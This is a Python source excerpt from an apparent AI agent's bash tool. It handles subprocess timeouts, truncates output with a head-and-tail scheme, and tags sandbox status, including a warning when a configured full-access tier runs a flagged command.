                # Non-interactive daemon: git/gh children must fail fast
                # silently, never spawn GCM/askpass popups (rant
                # 2026-08-07T10:17:27).
                env=no_prompt_env(),
                preexec_fn=os.setsid if os.name != "nt" else None,
                # Windows: background daemon children must never pop a
                # console window (rant 2026-08-09T13:16:36 — cmd-window
                # storm; bash tool was a top contributor).
                **win32_no_window_kwargs(),
            )
            try:
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=timeout
                )
            except asyncio.TimeoutError:
                # Kill entire process group to prevent orphaned children
                try:
                    if os.name != "nt":
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    else:
                        proc.kill()
                except (ProcessLookupError, OSError):
                    proc.kill()
                await proc.wait()
                return ToolResult(
                    name="bash",
                    content=f"Command timed out after {timeout}s: {cmd[:100]}",
                    error=True,
                )
            finally:
                if temp_path:
                    try:
                        os.unlink(temp_path)
                    except OSError:
                        pass

            out = _decode_output(stdout).rstrip()
            err = _decode_output(stderr).rstrip()

            # Smart truncation: keep stderr intact (errors are critical),
            # truncate stdout with head+tail when output exceeds limit.
            # This ensures build/test errors at the tail aren't lost.
            ERR_MAX = 30_000  # Always keep stderr up to this
            HEAD_TAIL_RATIO = 0.6  # 60% head, 40% tail
            _SEP = "\n[stderr]\n"  # 10 chars, separator prefix

            if len(err) > ERR_MAX:
                half = ERR_MAX // 2
                err = (
                    f"{err[:half]}\n\n"
                    f"... [stderr truncated: {len(err)} → {ERR_MAX} chars, head+tail kept]"
                    f"\n\n{err[-half:]}"
                )

            # Calculate remaining budget for stdout (accounting for separator)
            err_overhead = len(_SEP) if (out and err) else 0
            remaining = MAX_OUTPUT_CHARS - len(err) - err_overhead
            if remaining < 2000 and err:
                # stderr consumed most budget — truncate stderr further
                remaining = MAX_OUTPUT_CHARS // 2
                err = err[:remaining] + (
                    "\n\n... [stderr truncated to make room for stdout]"
                )

            if out and len(out) > remaining:
                head_chars = int(remaining * HEAD_TAIL_RATIO)
                tail_chars = remaining - head_chars - 200  # message overhead
                if tail_chars < 500:
                    out = out[:remaining - 50] + (
                        f"\n\n... [stdout truncated: {len(out)} → {remaining} chars]"
                    )
                else:
                    out = (
                        f"{out[:head_chars]}\n\n"
                        f"... [{len(out) - remaining} chars omitted] ..."
                        f"\n\n{out[-tail_chars:]}"
                    )

            parts: list[str] = []
            if out:
                parts.append(out)
            if err:
                parts.append(f"[stderr]\n{err}")
            if not parts:
                parts.append("(no output)")
            result = "\n".join(parts)
            if sandbox_tag:
                result = f"{sandbox_tag} ok\n{result}"
            if containment_warning:
                result += (
                    f"\n⚠️ [sandbox:danger-full-access] {containment_warning} "
                    "— executed anyway (danger tier opts into no blocking)"
                )
            return ToolResult(name="bash", content=result)
        except FileNotFoundError:
            return ToolResult(
                name="bash",
                content=f"Command not found: {cmd[:100]}",
                error=True,
            )
        except OSError as e:
            logger.warning("bash error: %s", e)
            return ToolResult(name="bash", content=f"Error: {e}", error=True)
